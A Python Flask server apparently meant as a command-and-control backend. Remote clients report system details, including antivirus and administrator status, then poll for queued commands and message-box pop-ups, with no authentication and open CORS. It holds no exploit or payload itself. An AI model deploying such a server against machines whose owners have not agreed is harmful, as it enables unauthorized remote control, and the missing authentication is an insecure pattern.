from flask import Flask, request, jsonify
from flask_cors import CORS # Import CORS
import time # Import time for last_seen timestamp

app = Flask(__name__)
CORS(app) # Enable CORS for all origins
client_commands = {}
connected_clients = {} # New dictionary to store connected clients

# Configuration
CLIENT_OFFLINE_THRESHOLD = 15 # seconds

@app.route('/health')
def health_check():
    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json() # Expect JSON data from web interface
    client_id = data.get('client_id')
    ip = data.get('ip')
    system_info = data.get('system_info', {}) # Get system_info, default to empty dict
    
    if client_id:
        connected_clients[client_id] = {
            "ip": ip,
            "status": "online",
            "last_seen": time.time(),
            "cpu": system_info.get('cpu'),
            "memory_total": system_info.get('memory_total'),
            "memory_used": system_info.get('memory_used'),
            "memory_percent": system_info.get('memory_percent'),
            "disks": system_info.get('disks', []),
            "uptime": system_info.get('uptime'),
            "antivirus": system_info.get('antivirus'), # Get antivirus status
            "is_admin": system_info.get('is_admin'), # Get admin status
            "temp": system_info.get('temp'), # Get current temperature
            "temp_max": system_info.get('temp_max') # Get max temperature
        }
        print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Temp: {system_info.get('temp')}°C. Clients online: {len(connected_clients)}")
    return jsonify({"status": "ok"})

@app.route('/send-command', methods=['POST'])
def send_command():
    data = request.get_json() # Expect JSON data from web interface
    client_id = data.get("client_id")
    cmd = data.get("cmd")
    title = data.get("title", "")
    message = data.get("message", "")
    icon = data.get("icon", "") # Get icon, default empty string
    buttons = data.get("buttons", "") # Get buttons, default empty string
    topmost = data.get("topmost", False) # Get topmost, default False

    if client_id and cmd:
        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost}
        print(f"Command '{cmd}' for client {client_id} (Title: '{title}', Message: '{message}', Icon: '{icon}', Buttons: '{buttons}', Top Most: {topmost}) received.")
        return jsonify({"status": "success", "message": "Command received"}), 200
    print(f"Invalid command data received: {data}")
    return jsonify({"status": "error", "message": "Invalid command data"}), 400

@app.route('/get-command')
def get_command():
    client_id = request.args.get('client_id')
    if client_id in client_commands:
        command_data = client_commands.pop(client_id) # Get and remove the command
        print(f"Sending command '{command_data.get('cmd')}' to client {client_id}")
        return jsonify(command_data)
    
    print(f"No command for client {client_id}")
    return jsonify({"cmd": "", "title": "", "message": "", "icon": "", "buttons": "", "topmost": False}) # Return empty JSON if no command

@app.route('/get-clients')
def get_clients():
    current_time = time.time()
    clients_to_remove = []

    # Check for offline clients
    for client_id, client_info in list(connected_clients.items()): # Use list() to iterate over a copy
        if current_time - client_info["last_seen"] > CLIENT_OFFLINE_THRESHOLD:
            if client_info["status"] != "offline":
                print(f"Client {client_id} marked as OFFLINE.")
            connected_clients[client_id]["status"] = "offline"
        
        # Optional: Remove clients that have been offline for a longer period (e.g., 5 minutes)
        # if client_info["status"] == "offline" and (current_time - client_info["last_seen"]) > (CLIENT_OFFLINE_THRESHOLD * 20):
        #     clients_to_remove.append(client_id)

    # for client_id in clients_to_remove:
    #     del connected_clients[client_id]

    print(f"Returning {len(connected_clients)} connected clients (after offline check).")
    return jsonify(connected_clients)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
